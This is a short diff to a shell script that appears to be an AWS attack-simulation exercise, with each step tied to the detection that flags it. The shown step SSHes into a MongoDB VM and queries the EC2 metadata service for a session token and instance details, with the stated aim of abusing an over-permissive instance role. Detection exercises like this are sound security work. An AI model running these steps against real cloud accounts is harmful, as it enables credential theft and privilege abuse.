@@ -29,6 +29,7 @@ echo "DETECTED BY: Config INCOMING_SSH_DISABLED, Security Hub EC2.13, GuardDuty 
 step "A3. Abuse the VM's over-permissive instance role (W3)"
 ssh -o StrictHostKeyChecking=accept-new -i /tmp/mongo.pem "ubuntu@$MONGO_PUB" '
   set +e
+  export AWS_DEFAULT_REGION='"$AWS_REGION"'
   TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
   md() { curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/$1; }
   AMI=$(md ami-id); MAC=$(md mac); SUBNET=$(md network/interfaces/macs/$MAC/subnet-id)
